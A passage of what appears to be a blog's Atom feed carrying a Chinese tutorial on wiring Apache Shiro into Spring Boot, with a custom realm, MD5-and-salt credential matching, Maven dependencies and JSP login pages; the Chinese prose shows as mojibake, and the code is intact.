class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.shiro.realms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.entity.<span class="type">User</span>;</span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.service.<span class="type">UserService</span>;</span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.utils.<span class="type">ApplicationContextUtils</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationException</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">AuthenticationToken</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.<span class="type">SimpleAuthenticationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.<span class="type">AuthorizationInfo</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.<span class="type">AuthorizingRealm</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.<span class="type">PrincipalCollection</span>;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.<span class="type">ByteSource</span>;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.<span class="type">ObjectUtils</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è‡ªå®šä¹‰Realm</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">CustomerRealm</span> <span class="keyword">extends</span> <span class="title">AuthorizingRealm</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthorizationInfo</span> doGetAuthorizationInfo(<span class="type">PrincipalCollection</span> principalCollection) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">AuthenticationInfo</span> doGetAuthenticationInfo(<span class="type">AuthenticationToken</span> authenticationToken) <span class="keyword">throws</span> <span class="type">AuthenticationException</span> &#123;</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="string">"====================================="</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ ¹æ®èº«ä»½ä¿¡æ¯</span></span><br><span class="line">        <span class="type">String</span> principal = (<span class="type">String</span>)authenticationToken.getPrincipal();</span><br><span class="line">        <span class="comment">//åœ¨å·¥å‚ä¸­è·å–serviceå¯¹è±¡</span></span><br><span class="line">        <span class="type">UserService</span> userService = (<span class="type">UserService</span>) <span class="type">ApplicationContextUtils</span>.getBean(<span class="string">"userService"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">User</span> user = userService.findByUserName(principal);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="type">ObjectUtils</span>.isEmpty(user))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="type">SimpleAuthenticationInfo</span>(user.getUsername(),user.getPassword(), <span class="type">ByteSource</span>.<span class="type">Util</span>.bytes(user.getSalt()),<span class="keyword">this</span>.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯è¿™æ ·è¿˜ä¸è¡Œ å› ä¸ºæˆ‘ä»¬çš„æ•°æ®è¿›è¡Œäº†md5å’ŒåŠ ç›çš„æ“ä½œ æ‰€ä»¥å¿…é¡»è¿˜è¦ä¿®æ”¹ä¸€ä¸‹å‡­è¯æ ¡éªŒåŒ¹é…å™¨<br>åœ¨ShiroConfigä¸­<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.<span class="built_in">config</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.shiro.realms.CustomerRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.credential.HashedCredentialsMatcher;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.Realm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç”¨æ¥æ•´åˆShiroæ¡†æ¶çš„é…ç½®ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> &#123;</span></span><br><span class="line">    <span class="comment">//1. åˆ›å»ºshiroFilter</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span></span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean shiroFilterFactoryBean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»™filterè®¾ç½®å®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//é…ç½®ç³»ç»Ÿå—é™èµ„æº</span></span><br><span class="line">        <span class="comment">//é…ç½®ç³»ç»Ÿå…¬å…±èµ„æº</span></span><br><span class="line">        Map&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt; <span class="built_in">map</span> = <span class="keyword">new</span> HashMap&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt;();</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/user/login"</span>,<span class="string">"anon"</span>); <span class="comment">//anon è®¾ç½®ä¸ºå…¬å…±èµ„æº</span></span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/user/register"</span>,<span class="string">"anon"</span>);</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/register.jsp"</span>,<span class="string">"anon"</span>);</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/**"</span>,<span class="string">"authc"</span>);  <span class="comment">//authc è¯·æ±‚è¿™ä¸ªèµ„æºéœ€è¦è®¤è¯å’Œæˆæƒ</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//é»˜è®¤è®¤è¯ç•Œé¢è·¯å¾„</span></span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">"/login.jsp"</span>);</span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. åˆ›å»ºå®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultWebSecurityManager <span class="title">getDefaultWebSecurityManager</span><span class="params">(@Qualifier(<span class="string">"getRealm"</span>) Realm realm)</span></span>&#123;</span><br><span class="line">        DefaultWebSecurityManager defaultWebSecurityManager = <span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»™å®‰å…¨ç®¡ç†å™¨è®¾ç½®realm</span></span><br><span class="line">        defaultWebSecurityManager.setRealm(realm);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> defaultWebSecurityManager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3. åˆ›å»ºè‡ªå®šä¹‰realm</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Realm <span class="title">getRealm</span><span class="params">()</span></span>&#123;</span><br><span class="line">        CustomerRealm customerRealm = <span class="keyword">new</span> CustomerRealm();</span><br><span class="line">        <span class="comment">//ä¿®æ”¹å‡­è¯æ ¡éªŒåŒ¹é…å™¨</span></span><br><span class="line">        HashedCredentialsMatcher credentialsMatcher = <span class="keyword">new</span> HashedCredentialsMatcher();</span><br><span class="line">        <span class="comment">//è®¾ç½®åŠ å¯†æ–¹å¼ä¸ºmd5</span></span><br><span class="line">        credentialsMatcher.setHashAlgorithmName(<span class="string">"MD5"</span>);</span><br><span class="line">        <span class="comment">//è®¾ç½®æ•£åˆ—æ¬¡æ•°</span></span><br><span class="line">        credentialsMatcher.setHashIterations(<span class="number">1024</span>);</span><br><span class="line">        customerRealm.setCredentialsMatcher(credentialsMatcher);</span><br><span class="line">        <span class="keyword">return</span> customerRealm;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·å°±å®Œæˆäº†æ•°æ®åº“+MD5+Saltçš„è®¤è¯åŠŸèƒ½äº†</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SpringBoot-Shiroæ•´åˆæ€è·¯&quot;&gt;&lt;a href=&quot;#SpringBoot-Shiroæ•´åˆæ€è·¯&quot; class=&quot;headerlink&quot; title=&quot;SpringBoot+Shiroæ•´åˆæ€è·¯&quot;&gt;&lt;/a&gt;SpringBoot+Shiroæ•´åˆæ€è·¯&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-2020/11/30-SpringBoot+Shiroæ•´åˆ</title>
    <link href="http://yoursite.com/2020/11/30/Shiro-2020-11-30-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/11/30/Shiro-2020-11-30-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-11-30T05:10:37.000Z</published>
    <updated>2021-02-21T04:57:42.898Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SpringBoot-Shiro"><a href="#SpringBoot-Shiro" class="headerlink" title="SpringBoot+Shiro"></a>SpringBoot+Shiro</h1><h2 id="æ•´åˆæ€è·¯"><a href="#æ•´åˆæ€è·¯" class="headerlink" title="æ•´åˆæ€è·¯"></a>æ•´åˆæ€è·¯</h2><p><img src="/img/JavaWeb/11-30å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><h2 id="å¼•å…¥Shiroä¾èµ–"><a href="#å¼•å…¥Shiroä¾èµ–" class="headerlink" title="å¼•å…¥Shiroä¾èµ–"></a>å¼•å…¥Shiroä¾èµ–</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºSpringBooté¡¹ç›®å°±ä¸å¤šè¯´äº†</p><p>è¿˜éœ€è¦å¼•å…¥ä¸€ä¸‹jstlçš„ä¾èµ–<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">         <span class="comment">&lt;!--        å¼•å…¥jspè§£æä¾èµ–--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        jstl--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        servlet-api--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>application.propertiesæ–‡ä»¶é…ç½®ä¸º<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="number">8080</span></span><br><span class="line"><span class="attr">server.servlet.context-path</span>=/shiro</span><br><span class="line"><span class="attr">spring.application.name</span>=shiro</span><br><span class="line"></span><br><span class="line"><span class="attr">spring.mvc.view.prefix</span>=/</span><br><span class="line"><span class="attr">spring.mvc.view.suffix</span>=.jsp</span><br></pre></td></tr></table></figure></p><p>è¿™æ ·ç¯å¢ƒå°±é…ç½®å¥½äº†</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>åœ¨webappä¸‹åˆ›å»ºindex.jpså’Œlogin.jsp<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@page contentType=<span class="string">"text/html;  UTF-8"</span> pageEncoding=<span class="string">"UTF-8"</span> isELIgnored=<span class="string">"false"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ç³»ç»Ÿä¸»é¡µV1.0<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>ç”¨æˆ·ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>å•†å“ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>è®¢å•ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>ç‰©æµç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>login.jsp<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@page contentType=<span class="string">"text/html;  UTF-8"</span> pageEncoding=<span class="string">"UTF-8"</span> isELIgnored=<span class="string">"false"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!doctype html&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span></span><br><span class="line"><span class="xml">          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"&gt;</span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>ç™»é™†é¡µé¢<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>æ¥ç€åˆ›å»ºä¸€ä¸ªconfigåŒ…æ¥å­˜æ”¾Shiroconfig<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.<span class="built_in">config</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ceit.springboot_jsp_shiro.shiro.realms.CustomerRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.Realm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.spring.web.ShiroFilterFactoryBean;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.web.mgt.DefaultWebSecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ç”¨æ¥æ•´åˆShiroæ¡†æ¶çš„é…ç½®ç±»</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@Configuration</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> &#123;</span></span><br><span class="line">    <span class="comment">//1. åˆ›å»ºshiroFilter</span></span><br><span class="line">    @Bean</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span></span>&#123;</span><br><span class="line">        ShiroFilterFactoryBean shiroFilterFactoryBean = <span class="keyword">new</span> ShiroFilterFactoryBean();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//ç»™filterè®¾ç½®å®‰å…¨ç®¡ç†å™¨</span></span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(defaultWebSecurityManager);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//é…ç½®ç³»ç»Ÿå—é™èµ„æº</span></span><br><span class="line">        <span class="comment">//é…ç½®ç³»ç»Ÿå…¬å…±èµ„æº</span></span><br><span class="line">        Map&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt; <span class="built_in">map</span> = <span class="keyword">new</span> HashMap&lt;<span class="keyword">String</span>,<span class="keyword">String</span>&gt;();</span><br><span class="line">        <span class="built_in">map</span>.<span class="built_in">put</span>(<span class="string">"/index.jsp"</span>,<span class="string">"authc"</span>);  <span class="comment">//authcè¯·æ±‚è¿™ä¸ªèµ„æºéœ€è¦è®¤è¯å’Œæˆæƒ</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//é»˜è®¤è®¤è¯ç•Œé¢è·¯å¾„</span></span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">"/login.jsp"</span>);</span><br><span class="line"></span><br><span class="line">        shiroFilterFactoryBean.setFilterChainDefinitionMap(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//2. 